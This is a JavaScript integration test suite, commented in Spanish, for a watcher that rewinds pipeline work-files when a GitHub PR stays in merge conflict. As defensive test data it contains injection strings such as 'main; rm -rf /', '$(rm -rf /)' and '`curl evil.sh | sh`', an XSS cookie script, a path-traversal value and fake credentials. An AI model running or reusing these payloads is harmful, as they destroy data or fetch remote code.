'use strict';

// =============================================================================
// pr-mergeability-integration.test.js — La cadena REAL de punta a punta (#4968)
// =============================================================================
//
// Ejercita los TRES módulos de verdad, sin dobles de los eslabones internos:
//
//     brazo-pr-mergeability-core (#4968)
//        -> pr-mergeability-watcher.runWatcherPoll  (#4966)
//        -> pr-info-fetcher.fetch*Async             (#4966)
//        -> pipeline-rewind.rewindFromMergeConflict (#4967)
//
// Sin red: el único doble es el `ghCall` del Pulpo, que devuelve el JSON que
// devolvería `gh`. Todo el resto —el filtro del universo, la secuencia de dos
// observaciones, la dedupe, el lock, la revalidación TOCTOU, la transacción de
// archivos y la auditoría— corre de verdad sobre un tmpdir.
//
// Cubre CA-4, CA-5, CA-6, CA-7 y CA-8.
// =============================================================================

const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const path = require('node:path');
const os = require('node:os');
const yaml = require('js-yaml');

const core = require('../brazo-pr-mergeability-core');
const watcher = require('../pr-mergeability-watcher');

// -----------------------------------------------------------------------------
// Sandbox
// -----------------------------------------------------------------------------

const CONFIG = Object.freeze({
  pipelines: {
    desarrollo: {
      fases: ['validacion', 'dev', 'build', 'verificacion', 'aprobacion', 'entrega'],
      skills_por_fase: {
        validacion: ['po', 'ux', 'guru'],
        dev: ['pipeline-dev', 'backend-dev'],
        build: ['build'],
        verificacion: ['tester'],
        aprobacion: ['review', 'po'],
        entrega: ['delivery'],
      },
    },
  },
});

const REPO = 'intrale/platform';
const ISSUE_A = 4968;   // el que entra en conflicto
const ISSUE_B = 4970;   // independiente: tiene que seguir su curso
const PR_A = 8123;
const PR_B = 8124;
const OID_A = 'a1b2c3d'.padEnd(40, '0');
const OID_NUEVO = 'f9e8d7c'.padEnd(40, '0');

const WAVE = Object.freeze({ number: 8, issues: [{ number: ISSUE_A }, { number: ISSUE_B }] });

// Sección de config con el flag ENCENDIDO. Sólo para los tests: lo que se
// mergea a `main` es `enabled: false` (verificado en el test unitario del core).
function seccion(over = {}) {
  return {
    enabled: true,
    expected_repo: REPO,
    expected_owner: 'intrale',
    expected_base: 'main',
    poll_interval_minutes: 10,
    min_poll_interval_ms: 60_000,
    candidate_limit: 20,
    gh_timeout_ms: 5_000,
    state_entry_ttl_hours: 72,
    kill_switch: false,
    allowed_repos: [REPO],
    max_concurrency: 2,
    backoff_base_ms: 60_000,
    backoff_max_ms: 900_000,
    wedge_timeout_ms: 600_000,
    ...over,
  };
}

function sandbox() {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'mergeability-e2e-'));
  for (const [pipeline, cfg] of Object.entries(CONFIG.pipelines)) {
    for (const fase of cfg.fases) {
      for (const estado of ['pendiente', 'trabajando', 'listo', 'procesado']) {
        fs.mkdirSync(path.join(root, pipeline, fase, estado), { recursive: true });
      }
    }
  }
  fs.mkdirSync(path.join(root, 'audit'), { recursive: true });
  fs.mkdirSync(path.join(root, 'state'), { recursive: true });
  return root;
}

/**
 * Deja un work-file del issue en `desarrollo/<fase>/<estado>`.
 *
 * El default es `dev/trabajando` con `pipeline-dev` — el mismo molde que usa
 * `mcDropOwner` en `pipeline-rewind.test.js`. Importa que el skill esté
 * declarado en `skills_por_fase` de esa fase: si no, `resolveMergeConflictOwner`
 * corta con `OWNER_NOT_FOUND` y el rewind nunca llega a mutar.
 */
function dropIssue(root, issue, { skill = 'pipeline-dev', fase = 'dev', estado = 'trabajando' } = {}) {
  const file = path.join(root, 'desarrollo', fase, estado, `${issue}.${skill}`);
  fs.writeFileSync(file, yaml.dump({ issue, pipeline: 'desarrollo', fase, skill }));
  return file;
}

/** ¿Dónde está hoy el work-file de un issue? `null` si no está en ningún lado. */
function ubicacion(root, issue) {
  for (const fase of CONFIG.pipelines.desarrollo.fases) {
    for (const estado of ['pendiente', 'trabajando', 'listo', 'procesado']) {
      const dir = path.join(root, 'desarrollo', fase, estado);
      const hit = fs.readdirSync(dir).find(f => f.startsWith(`${issue}.`));
      if (hit) return { fase, estado, file: path.join(dir, hit) };
    }
  }
  return null;
}

/** Foto completa del árbol de work-files: sirve para probar "cero mutación". */
function snapshotFs(root) {
  const out = [];
  const walk = (dir) => {
    for (const e of fs.readdirSync(dir, { withFileTypes: true })) {
      const p = path.join(dir, e.name);
      if (e.isDirectory()) walk(p);
      else out.push(path.relative(root, p));
    }
  };
  walk(path.join(root, 'desarrollo'));
  return out.sort();
}

function auditJsonl(root) {
  const file = watcher.eventsPath(root);
  if (!fs.existsSync(file)) return [];
  return fs.readFileSync(file, 'utf8').trim().split('\n').filter(Boolean).map(l => JSON.parse(l));
}

// -----------------------------------------------------------------------------
// El doble de `gh`: devuelve exactamente lo que devolvería el binario
// -----------------------------------------------------------------------------

function prJson(over = {}) {
  return {
    number: PR_A,
    state: 'OPEN',
    mergeable: 'CONFLICTING',
    mergeStateStatus: 'DIRTY',
    headRefOid: OID_A,
    headRefName: `agent/${ISSUE_A}-pipeline-dev`,
    baseRefName: 'main',
    isCrossRepository: false,
    headRepositoryOwner: { login: 'intrale' },
    ...over,
  };
}

/**
 * `ghCall` con el contrato del Pulpo: resuelve `{stdout, stderr}` o RECHAZA.
 * `guion` decide qué contesta cada `pr list` / `pr view`.
 */
function fakeGhCall(guion) {
  const llamadas = [];
  const fn = async (args, timeoutMs, onSpawn) => {
    llamadas.push({ args: args.slice(), timeoutMs });
    if (typeof onSpawn === 'function') onSpawn(4321); // el pid que registraría el runner real
    const sub = args[1]; // 'list' | 'view'
    const res = await guion({ sub, args, llamada: llamadas.length });
    if (res instanceof Error) throw res;
    return { stdout: JSON.stringify(res), stderr: '' };
  };
  fn.llamadas = llamadas;
  fn.count = () => llamadas.length;
  return fn;
}

/** Un tick completo del brazo contra la cadena real. */
async function tick(root, { ghCall, now, over = {}, config = CONFIG } = {}) {
  const norm = core.normalizeWatcherConfig(seccion(over));
  assert.equal(norm.ok, true, `config del test inválida: ${norm.reason}`);
  return core.runTick(norm.cfg, {
    ghCall,
    getActiveWave: () => WAVE,
    pipelineRoot: root,
    config,
    yaml,
    now,
  });
}

/** Reloj que avanza lo suficiente entre polls para que la secuencia cuente. */
function reloj(start = 1_700_000_000_000) {
  let t = start;
  return { now: () => t, avanzarPoll: () => { t += 10 * 60_000; }, avanzar: (ms) => { t += ms; } };
}

// -----------------------------------------------------------------------------
// CA-4 — un conflicto estable produce EXACTAMENTE un rewind
// -----------------------------------------------------------------------------

test('#4968 CA-4: dos observaciones separadas por un poll ⇒ un solo rewind, por el mecanismo canónico', async () => {
  const root = sandbox();
  dropIssue(root, ISSUE_A);
  const clock = reloj();
  const gh = fakeGhCall(async ({ sub }) => (sub === 'list' ? [prJson({ mergeable: 'UNKNOWN', mergeStateStatus: 'UNKNOWN' })] : prJson()));

  // Poll 1: primera muestra conflictiva. Todavía NO alcanza (single_sample).
  const t1 = await tick(root, { ghCall: gh, now: clock.now });
  assert.equal(t1.ok, true);
  assert.equal(t1.rewound.length, 0, 'una sola observación no puede mutar');
  assert.deepEqual(
    { fase: ubicacion(root, ISSUE_A).fase, estado: ubicacion(root, ISSUE_A).estado },
    { fase: 'dev', estado: 'trabajando' },
    'el issue no se movió',
  );

  // Poll 2: se confirma el conflicto ⇒ rewind.
  clock.avanzarPoll();
  const t2 = await tick(root, { ghCall: gh, now: clock.now });
  assert.equal(t2.ok, true);
  assert.deepEqual(t2.rewound, [{ issue: ISSUE_A, pr: PR_A }], 'el conflicto estable produce el rewind');

  // La mutación la hizo el rewind canónico: el work-file volvió a `dev`.
  const pos = ubicacion(root, ISSUE_A);
  assert.equal(pos.fase, 'dev');
  assert.equal(pos.estado, 'pendiente');

  // Polls 3..6 sobre el MISMO conflicto: sigue siendo 1.
  for (let i = 0; i < 4; i += 1) {
    clock.avanzarPoll();
    const extra = await tick(root, { ghCall: gh, now: clock.now });
    assert.equal(extra.rewound.length, 0, `tick extra ${i}: no puede rebobinar de nuevo`);
  }
});

test('#4968 CA-4: la dedupe sobrevive al reinicio del Pulpo (estado recargado del disco)', async () => {
  const root = sandbox();
  dropIssue(root, ISSUE_A);
  const clock = reloj();
  const gh = fakeGhCall(async ({ sub }) => (sub === 'list' ? [prJson({ mergeable: 'UNKNOWN', mergeStateStatus: 'UNKNOWN' })] : prJson()));

  await tick(root, { ghCall: gh, now: clock.now });
  clock.avanzarPoll();
  const t2 = await tick(root, { ghCall: gh, now: clock.now });
  assert.equal(t2.rewound.length, 1);

  // "Reinicio": nada en memoria sobrevive. El brazo, el scheduler y el guard se
  // construyen de cero en cada tick de este test, así que la única continuidad
  // posible es la del filesystem — que es justo lo que hay que verificar.
  delete require.cache[require.resolve('../pr-mergeability-watcher')];
  delete require.cache[require.resolve('../pipeline-rewind')];
  delete require.cache[require.resolve('../brazo-pr-mergeability-core')];
  const coreFresco = require('../brazo-pr-mergeability-core');

  clock.avanzarPoll();
  const norm = coreFresco.normalizeWatcherConfig(seccion());
  const t3 = await coreFresco.runTick(norm.cfg, {
    ghCall: gh, getActiveWave: () => WAVE, pipelineRoot: root, config: CONFIG, yaml, now: clock.now,
  });
  assert.equal(t3.rewound.length, 0, 'tras el reinicio sigue siendo UN solo rewind');
});

test('#4968 CA-4: estados transitorios y datos incompletos ⇒ CERO mutación, no-op auditado', async () => {
  const escenarios = {
    'UNKNOWN permanente': () => prJson({ mergeable: 'UNKNOWN', mergeStateStatus: 'UNKNOWN' }),
    'PR ya cerrado': () => prJson({ state: 'CLOSED' }),
    'base cambiada': () => prJson({ baseRefName: 'develop' }),
    'PR de un fork': () => prJson({ isCrossRepository: true, headRepositoryOwner: { login: 'atacante' } }),
    'rama fuera de la convención': () => prJson({ headRefName: 'docs/algo' }),
    'issue fuera de la ola': () => prJson({ headRefName: 'agent/99999-dev' }),
    'schema incompleto': () => ({ number: PR_A, state: 'OPEN' }),
    'owner distinto': () => prJson({ headRepositoryOwner: { login: 'otro' } }),
  };

  for (const [nombre, hacerPr] of Object.entries(escenarios)) {
    const root = sandbox();
    dropIssue(root, ISSUE_A);
    const antes = snapshotFs(root);
    const clock = reloj();
    const gh = fakeGhCall(async () => [hacerPr()]);

    // Varios polls: ni con insistencia puede mutar.
    for (let i = 0; i < 4; i += 1) {
      const r = await tick(root, { ghCall: gh, now: clock.now });
      assert.equal(r.rewound.length, 0, `${nombre}: no puede rebobinar`);
      clock.avanzarPoll();
    }
    assert.deepEqual(snapshotFs(root), antes, `${nombre}: cero mutación de FS`);
    assert.ok(auditJsonl(root).length > 0, `${nombre}: el no-op quedó auditado`);
  }
});

test('#4968 CA-4: flapping (conflicto → sano → conflicto) no acumula secuencia', async () => {
  const root = sandbox();
  dropIssue(root, ISSUE_A);
  const antes = snapshotFs(root);
  const clock = reloj();
  let n = 0;
  const gh = fakeGhCall(async ({ sub }) => {
    if (sub === 'list') return [prJson({ mergeable: 'UNKNOWN', mergeStateStatus: 'UNKNOWN' })];
    n += 1;
    // conflicto, sano, conflicto, sano...
    return n % 2 === 1 ? prJson() : prJson({ mergeable: 'MERGEABLE', mergeStateStatus: 'CLEAN' });
  });

  for (let i = 0; i < 6; i += 1) {
    const r = await tick(root, { ghCall: gh, now: clock.now });
    assert.equal(r.rewound.length, 0, `poll ${i}: el flapping no confirma un conflicto`);
    clock.avanzarPoll();
  }
  assert.deepEqual(snapshotFs(root), antes);
});

test('#4968 CA-4: el SHA cambia entre la observación y la acción ⇒ no-op (TOCTOU)', async () => {
  const root = sandbox();
  dropIssue(root, ISSUE_A);
  const antes = snapshotFs(root);
  const clock = reloj();

  // Las dos observaciones ven OID_A; la revalidación DENTRO del lock ve otro
  // head (alguien pusheó en el medio) ⇒ el rewind se cierra.
  let observaciones = 0;
  const gh = fakeGhCall(async ({ sub }) => {
    if (sub === 'list') return [prJson({ mergeable: 'UNKNOWN', mergeStateStatus: 'UNKNOWN' })];
    observaciones += 1;
    return observaciones <= 2 ? prJson() : prJson({ headRefOid: OID_NUEVO });
  });

  await tick(root, { ghCall: gh, now: clock.now });
  clock.avanzarPoll();
  const t2 = await tick(root, { ghCall: gh, now: clock.now });

  assert.equal(t2.rewound.length, 0, 'con el head cambiado no se muta');
  assert.equal(t2.blocked[0].code, 'PR_SHA_CHANGED');
  assert.deepEqual(snapshotFs(root), antes, 'cero mutación de FS');
});

test('#4968 CA-4: el PR se cierra entre la observación y la acción ⇒ no-op', async () => {
  const root = sandbox();
  dropIssue(root, ISSUE_A);
  const antes = snapshotFs(root);
  const clock = reloj();
  let obs = 0;
  const gh = fakeGhCall(async ({ sub }) => {
    if (sub === 'list') return [prJson({ mergeable: 'UNKNOWN', mergeStateStatus: 'UNKNOWN' })];
    obs += 1;
    return obs <= 2 ? prJson() : prJson({ state: 'CLOSED' });
  });

  await tick(root, { ghCall: gh, now: clock.now });
  clock.avanzarPoll();
  const t2 = await tick(root, { ghCall: gh, now: clock.now });
  assert.equal(t2.rewound.length, 0);
  assert.equal(t2.blocked[0].code, 'PR_CLOSED');
  assert.deepEqual(snapshotFs(root), antes);
});

test('#4968 CA-4: asociación ambigua (dos PRs abiertos para el mismo issue) ⇒ no-op', async () => {
  const root = sandbox();
  dropIssue(root, ISSUE_A);
  const antes = snapshotFs(root);
  const clock = reloj();
  const gh = fakeGhCall(async () => [
    prJson(),
    prJson({ number: PR_A + 1, headRefOid: OID_NUEVO }),
  ]);

  for (let i = 0; i < 3; i += 1) {
    const r = await tick(root, { ghCall: gh, now: clock.now });
    assert.equal(r.rewound.length, 0);
    clock.avanzarPoll();
  }
  assert.deepEqual(snapshotFs(root), antes);
  assert.ok(auditJsonl(root).some(a => a.reason === 'ambiguous_association'));
});

// -----------------------------------------------------------------------------
// CA-2 / CA-8 — GitHub caído y config rota no frenan nada
// -----------------------------------------------------------------------------

test('#4968 CA-2: timeout, rate limit y exit != 0 ⇒ tick no-ok, cero mutación, sin excepción', async () => {
  const fallos = {
    timeout: Object.assign(new Error('gh-call-timeout: 5000ms'), { code: 'GH_CALL_TIMEOUT' }),
    breaker_abierto: Object.assign(new Error('gh-circuit-open'), { code: 'GH_CIRCUIT_OPEN' }),
    gh_ausente: Object.assign(new Error('spawn gh ENOENT'), { code: 'ENOENT' }),
  };
  for (const [nombre, err] of Object.entries(fallos)) {
    const root = sandbox();
    dropIssue(root, ISSUE_A);
    const antes = snapshotFs(root);
    const gh = fakeGhCall(async () => err);
    let r;
    await assert.doesNotReject(async () => { r = await tick(root, { ghCall: gh, now: () => 1 }); }, nombre);
    assert.equal(r.ok, false, nombre);
    assert.equal(r.rewound.length, 0, nombre);
    assert.deepEqual(snapshotFs(root), antes, `${nombre}: cero mutación`);
  }
});

test('#4968 CA-2: JSON inválido de `gh` ⇒ no-op auditado, no excepción', async () => {
  const root = sandbox();
  dropIssue(root, ISSUE_A);
  const antes = snapshotFs(root);
  const gh = async () => ({ stdout: '{ esto no es json', stderr: '' });
  const r = await tick(root, { ghCall: gh, now: () => 1 });
  assert.equal(r.ok, false);
  assert.deepEqual(snapshotFs(root), antes);
});

test('#4968 CA-8: config inválida dentro de la cadena integrada ⇒ no-op sin excepción', async () => {
  for (const over of [
    { max_concurrency: 0 },
    { expected_repo: '../../etc/passwd' },
    { expected_base: 'main; rm -rf /' },
    { poll_interval_minutes: -1 },
    { kill_switch: true },
    { enabled: false },
  ]) {
    const root = sandbox();
    dropIssue(root, ISSUE_A);
    const antes = snapshotFs(root);
    let ghCalls = 0;
    const gh = async () => { ghCalls += 1; return { stdout: '[]', stderr: '' }; };

    const norm = core.normalizeWatcherConfig(seccion(over));
    assert.equal(norm.ok, false, `${JSON.stringify(over)} debía quedar fail-closed`);
    assert.ok(typeof norm.reason === 'string' && norm.reason.length > 0, 'motivo tipado');

    // Emulación fiel del wrapper: con `ok:false` no se llama a `runTick`.
    if (norm.ok) await core.runTick(norm.cfg, { ghCall: gh, getActiveWave: () => WAVE, pipelineRoot: root, config: CONFIG, yaml });
    assert.equal(ghCalls, 0, `${JSON.stringify(over)}: CERO llamadas a GitHub`);
    assert.deepEqual(snapshotFs(root), antes);
  }
});

test('#4968 CA-8: el brazo respeta `expected_repo` — nunca consulta otro repo', async () => {
  const root = sandbox();
  dropIssue(root, ISSUE_A);
  const gh = fakeGhCall(async () => []);
  await tick(root, { ghCall: gh, now: () => 1 });
  assert.ok(gh.count() > 0, 'hubo al menos un pr list');
  for (const { args } of gh.llamadas) {
    const i = args.indexOf('--repo');
    assert.ok(i >= 0, 'toda llamada declara el repo');
    assert.equal(args[i + 1], REPO, 'el repo consultado es el declarado en config');
  }
});

// -----------------------------------------------------------------------------
// CA-5 — independientes siguen; dependientes se liberan por el camino canónico
// -----------------------------------------------------------------------------

test('#4968 CA-5: un issue independiente de la misma ola no se ve tocado por el rewind', async () => {
  const root = sandbox();
  dropIssue(root, ISSUE_A);
  const fileB = dropIssue(root, ISSUE_B, { skill: 'tester', fase: 'verificacion', estado: 'pendiente' });
  const antesB = fs.readFileSync(fileB, 'utf8');
  const clock = reloj();
  const gh = fakeGhCall(async ({ sub }) => (sub === 'list' ? [prJson({ mergeable: 'UNKNOWN', mergeStateStatus: 'UNKNOWN' })] : prJson()));

  await tick(root, { ghCall: gh, now: clock.now });
  clock.avanzarPoll();
  const t2 = await tick(root, { ghCall: gh, now: clock.now });
  assert.equal(t2.rewound.length, 1, 'A rebobinó');

  // B intacto: misma fase, mismo estado, mismo contenido.
  const posB = ubicacion(root, ISSUE_B);
  assert.deepEqual({ fase: posB.fase, estado: posB.estado }, { fase: 'verificacion', estado: 'pendiente' });
  assert.equal(fs.readFileSync(posB.file, 'utf8'), antesB, 'el work-file de B no se tocó');
});

test('#4968 CA-5: conflicto RESUELTO ⇒ el watcher deja de emitir y no vuelve a tocar el issue', async () => {
  const root = sandbox();
  dropIssue(root, ISSUE_A);
  const clock = reloj();
  let resuelto = false;
  const gh = fakeGhCall(async ({ sub }) => {
    if (sub === 'list') {
      return [resuelto
        ? prJson({ mergeable: 'MERGEABLE', mergeStateStatus: 'CLEAN' })
        : prJson({ mergeable: 'UNKNOWN', mergeStateStatus: 'UNKNOWN' })];
    }
    return prJson();
  });

  await tick(root, { ghCall: gh, now: clock.now });
  clock.avanzarPoll();
  assert.equal((await tick(root, { ghCall: gh, now: clock.now })).rewound.length, 1);

  // El dev resolvió el conflicto contra main.
  resuelto = true;
  const posTrasRewind = ubicacion(root, ISSUE_A);
  for (let i = 0; i < 3; i += 1) {
    clock.avanzarPoll();
    const r = await tick(root, { ghCall: gh, now: clock.now });
    assert.equal(r.rewound.length, 0, 'un PR sano no genera rewinds');
  }
  // El issue quedó libre en `dev/pendiente`: elegible por el camino canónico
  // (`brazoBarrido`/`brazoLanzamiento`), sin que el watcher lo retenga.
  assert.deepEqual(ubicacion(root, ISSUE_A), posTrasRewind, 'el watcher no lo mueve más');
  assert.equal(posTrasRewind.estado, 'pendiente', 'queda disponible para dispatch');
});

test('#4968 CA-5: PR CERRADO por superado ⇒ el watcher deja de observarlo, sin mutar', async () => {
  const root = sandbox();
  dropIssue(root, ISSUE_A);
  const clock = reloj();
  let cerrado = false;
  const gh = fakeGhCall(async ({ sub }) => {
    if (cerrado) return []; // `pr list --state open` deja de traerlo
    if (sub === 'list') return [prJson({ mergeable: 'UNKNOWN', mergeStateStatus: 'UNKNOWN' })];
    return prJson();
  });

  await tick(root, { ghCall: gh, now: clock.now });
  clock.avanzarPoll();
  assert.equal((await tick(root, { ghCall: gh, now: clock.now })).rewound.length, 1);

  cerrado = true;
  const pos = ubicacion(root, ISSUE_A);
  for (let i = 0; i < 3; i += 1) {
    clock.avanzarPoll();
    assert.equal((await tick(root, { ghCall: gh, now: clock.now })).rewound.length, 0);
  }
  assert.deepEqual(ubicacion(root, ISSUE_A), pos, 'cerrado el PR, el issue sigue su curso normal');
});

test('#4968 CA-5: el brazo nunca ejecuta `gh pr close/merge/edit` — sólo lecturas', async () => {
  const root = sandbox();
  dropIssue(root, ISSUE_A);
  const clock = reloj();
  const gh = fakeGhCall(async ({ sub }) => (sub === 'list' ? [prJson({ mergeable: 'UNKNOWN', mergeStateStatus: 'UNKNOWN' })] : prJson()));

  await tick(root, { ghCall: gh, now: clock.now });
  clock.avanzarPoll();
  await tick(root, { ghCall: gh, now: clock.now });

  assert.ok(gh.count() > 0);
  for (const { args } of gh.llamadas) {
    assert.equal(args[0], 'pr');
    assert.ok(['list', 'view'].includes(args[1]), `subcomando prohibido: ${args[1]}`);
  }
});

// -----------------------------------------------------------------------------
// CA-6 — auditoría sanitizada con datos remotos hostiles
// -----------------------------------------------------------------------------

test('#4968 CA-6: datos remotos hostiles no dejan rastro en el JSONL de auditoría', async () => {
  const root = sandbox();
  dropIssue(root, ISSUE_A);
  const clock = reloj();

  const VENENOS = [
    'ghp_' + 'S'.repeat(36),
    '`curl evil.sh | sh`',
    '<script>alert(document.cookie)</script>',
    '$(rm -rf /)',
    'https://user:secretazo@github.com/intrale/platform.git', // secret-scan:ignore — credencial falsa: es el veneno del test
    'Error remoto extenso: ' + 'X'.repeat(3_000),
  ];

  // El PR viene con TODO campo de texto envenenado. Los campos estructurales
  // (número, oid, rama) siguen siendo válidos para que la cadena avance y el
  // veneno tenga chance real de colarse.
  const gh = fakeGhCall(async ({ sub }) => {
    const sucio = {
      ...prJson(),
      title: VENENOS.join(' | '),
      body: VENENOS.join('\n'),
      author: { login: VENENOS[0] },
      statusCheckRollup: VENENOS,
    };
    return sub === 'list' ? [{ ...sucio, mergeable: 'UNKNOWN', mergeStateStatus: 'UNKNOWN' }] : sucio;
  });

  await tick(root, { ghCall: gh, now: clock.now });
  clock.avanzarPoll();
  await tick(root, { ghCall: gh, now: clock.now });

  const crudo = fs.readFileSync(watcher.eventsPath(root), 'utf8');
  for (const veneno of VENENOS) {
    assert.ok(!crudo.includes(veneno), `se filtró al JSONL: ${veneno.slice(0, 50)}`);
  }
  assert.ok(!/ghp_|secretazo|<script>/.test(crudo), 'ni secretos ni markup remoto');

  // Assert POSITIVO: la auditoría sí tiene lo que el operador necesita.
  const registros = auditJsonl(root);
  assert.ok(registros.length > 0);
  const delBrazo = registros.filter(r => r.kind === 'brazo');
  assert.ok(delBrazo.length > 0, 'el brazo dejó su capa de decisión');
  const rewind = delBrazo.find(r => r.decision === core.DECISIONS.REWOUND);
  assert.ok(rewind, 'la decisión de rewind quedó registrada');
  assert.deepEqual(
    { repo: rewind.repo, pr: rewind.pr, issue: rewind.issue },
    { repo: REPO, pr: PR_A, issue: ISSUE_A },
  );
  assert.ok(Number.isFinite(rewind.ts) && rewind.ts > 0, 'timestamp presente');
  assert.ok(core.isKnownReasonCode(rewind.reason_code), 'el motivo es un código interno');
  // Esquema cerrado: ni una clave de más.
  for (const r of delBrazo) {
    assert.deepEqual(Object.keys(r).sort(), [...core.AUDIT_FIELDS].sort());
  }
});

test('#4968 CA-6: la auditoría es append-only (nunca se pisa lo anterior)', async () => {
  const root = sandbox();
  dropIssue(root, ISSUE_A);
  const clock = reloj();
  const gh = fakeGhCall(async ({ sub }) => (sub === 'list' ? [prJson({ mergeable: 'UNKNOWN', mergeStateStatus: 'UNKNOWN' })] : prJson()));

  const conteos = [];
  for (let i = 0; i < 4; i += 1) {
    await tick(root, { ghCall: gh, now: clock.now });
    clock.avanzarPoll();
    conteos.push(auditJsonl(root).length);
  }
  for (let i = 1; i < conteos.length; i += 1) {
    assert.ok(conteos[i] >= conteos[i - 1], `el JSONL nunca decrece: ${conteos.join(' -> ')}`);
  }
  assert.ok(conteos.at(-1) > conteos[0], 'y crece');
});

// -----------------------------------------------------------------------------
// CA-7 — el rewind automático NO se disfraza de rechazo humano
// -----------------------------------------------------------------------------

test('#4968 CA-7: el rewind del watcher no produce el texto del rechazo humano', async () => {
  const root = sandbox();
  dropIssue(root, ISSUE_A);
  const clock = reloj();
  const gh = fakeGhCall(async ({ sub }) => (sub === 'list' ? [prJson({ mergeable: 'UNKNOWN', mergeStateStatus: 'UNKNOWN' })] : prJson()));

  const rewinds = [];
  const rewindReal = require('../pipeline-rewind').rewindFromMergeConflict;

  const correr = async () => {
    const norm = core.normalizeWatcherConfig(seccion());
    return core.runTick(norm.cfg, {
      ghCall: gh, getActiveWave: () => WAVE, pipelineRoot: root, config: CONFIG, yaml, now: clock.now,
      // Espía transparente: delega en el rewind REAL y guarda su resultado.
      rewindFromMergeConflict: async (ev, deps) => {
        const r = await rewindReal(ev, deps);
        rewinds.push(r);
        return r;
      },
    });
  };

  await correr();
  clock.avanzarPoll();
  const t2 = await correr();
  assert.equal(t2.rewound.length, 1, 'hubo rewind');

  const r = rewinds.find(x => x && x.ok);
  assert.ok(r, 'el rewind real devolvió ok');

  // --- superficie legible del issue -----------------------------------------
  const comentario = r.commentBody || '';
  assert.ok(comentario.length > 0, 'hay comentario para el humano');
  assert.ok(!comentario.includes('Rebobinado por rechazo del operador'), 'no dice "rechazo del operador"');
  assert.ok(!comentario.includes('| Operador |'), 'no reutiliza el label "Operador" para un mecanismo');
  assert.ok(!/source="operator"/.test(comentario));
  // Y sí dice de qué se trata, con el PR y la base.
  assert.ok(/conflicto de merge/i.test(comentario), 'nombra el conflicto de merge');
  assert.ok(comentario.includes(String(PR_A)), 'explicita QUÉ PR entró en conflicto');

  // --- superficie que recibe el agente reencolado ---------------------------
  const pos = ubicacion(root, ISSUE_A);
  const wf = fs.readFileSync(pos.file, 'utf8');
  assert.ok(!wf.includes('source="operator"'), 'el work-file no declara origen humano');
  assert.ok(!/El operador \(.*\) rechaz/.test(wf), 'no le dice al agente que un operador lo rechazó');
  const parsed = yaml.load(wf);
  assert.equal(parsed.rechazado_por_skill, 'mergeability-watcher', 'la identidad propagada es el mecanismo');

  // --- un solo mensaje por evento, aunque corran N ticks --------------------
  for (let i = 0; i < 3; i += 1) {
    clock.avanzarPoll();
    await correr();
  }
  const oks = rewinds.filter(x => x && x.ok);
  assert.equal(oks.length, 1, 'un solo mensaje legible por evento, no uno por tick');
});

test('#4968 CA-7: ante UNKNOWN/timeout no se emite NINGÚN mensaje al humano (fail-closed en el texto)', async () => {
  for (const guion of [
    async () => [prJson({ mergeable: 'UNKNOWN', mergeStateStatus: 'UNKNOWN' })],
    async () => Object.assign(new Error('timeout'), { code: 'GH_CALL_TIMEOUT' }),
  ]) {
    const root = sandbox();
    dropIssue(root, ISSUE_A);
    const clock = reloj();
    const gh = fakeGhCall(guion);
    const rewinds = [];
    const rewindReal = require('../pipeline-rewind').rewindFromMergeConflict;

    for (let i = 0; i < 4; i += 1) {
      const norm = core.normalizeWatcherConfig(seccion());
      await core.runTick(norm.cfg, {
        ghCall: gh, getActiveWave: () => WAVE, pipelineRoot: root, config: CONFIG, yaml, now: clock.now,
        rewindFromMergeConflict: async (ev, deps) => { const r = await rewindReal(ev, deps); rewinds.push(r); return r; },
      });
      clock.avanzarPoll();
    }
    assert.equal(rewinds.length, 0, 'ni siquiera se invocó el rewind: nada que comunicar');
  }
});

// -----------------------------------------------------------------------------
// R-1 / R-2 (code review de #4968) — cadena REAL
// -----------------------------------------------------------------------------

test('#4968 R-1: un merge grande que deja 5 PRs en conflicto NO pierde ninguno', async () => {
  // El escenario canónico del feature: `main` avanza y varios PRs de la ola
  // quedan CONFLICTING a la vez. La cota de 3 rewinds/tick tiene que DIFERIR el
  // resto, no descartarlo — el poll de #4966 ya los marcó `emitted` y no los
  // vuelve a emitir.
  const root = sandbox();
  const issues = [5001, 5002, 5003, 5004, 5005];
  const prs = issues.map((n, i) => ({ issue: n, pr: 9000 + i, oid: `${'b'.repeat(39)}${i}` }));
  for (const n of issues) dropIssue(root, n);
  const ola = { number: 8, issues: issues.map(n => ({ number: n })) };
  const clock = reloj();

  const listado = (sanos) => prs.map(p => prJson({
    number: p.pr,
    issue: p.issue,
    headRefOid: p.oid,
    headRefName: `agent/${p.issue}-pipeline-dev`,
    ...(sanos ? { mergeable: 'UNKNOWN', mergeStateStatus: 'UNKNOWN' } : {}),
  }));
  const detalle = (numero) => {
    const p = prs.find(x => x.pr === numero);
    return prJson({ number: p.pr, headRefOid: p.oid, headRefName: `agent/${p.issue}-pipeline-dev` });
  };
  const gh = fakeGhCall(async ({ sub, args }) => {
    if (sub === 'list') return listado(true);
    const numero = Number(args[2]);
    return detalle(numero);
  });

  const buffer = core.createDeferredBuffer();
  const norm = core.normalizeWatcherConfig(seccion());
  const correr = async () => core.runTick(norm.cfg, {
    ghCall: gh, getActiveWave: () => ola, pipelineRoot: root, config: CONFIG, yaml,
    now: clock.now, deferred: buffer,
  });

  await correr();            // 1ª muestra: nada muta todavía
  clock.avanzarPoll();
  const t2 = await correr(); // se confirman los 5 conflictos

  assert.equal(t2.rewound.length, core.MAX_REWINDS_PER_TICK, 'la cota sigue vigente');
  assert.equal(t2.deferred.length, 2, 'los sobrantes se reportan');
  assert.equal(buffer.size(), 2, 'y quedan encolados para el próximo tick');

  // La §16.4 le promete al operador que un conflicto confirmado sin rewind
  // aparece en el JSONL: eso NO puede ser un renglón vacío.
  const diferidos = auditJsonl(root).filter(a => a.reason_code === core.TICK_REASONS.DEFERRED_OVER_CAP);
  assert.equal(diferidos.length, 2);
  assert.ok(diferidos.every(a => a.decision === core.DECISIONS.REWIND_BLOCKED && a.kind === 'brazo'));

  // Tick siguiente: el poll ya NO re-emite (`already_emitted`) y aun así los
  // dos diferidos terminan rebobinados por el canónico.
  clock.avanzarPoll();
  const t3 = await correr();
  assert.equal(t3.observed, 0, 'el watcher no vuelve a emitir estos eventos');
  assert.equal(t3.rewound.length, 2, 'los diferidos se procesaron igual');

  for (const n of issues) {
    assert.deepEqual(
      { fase: ubicacion(root, n).fase, estado: ubicacion(root, n).estado },
      { fase: 'dev', estado: 'pendiente' },
      `el issue ${n} volvió a dev por el mecanismo canónico`,
    );
  }
  assert.equal(buffer.size(), 0);
});

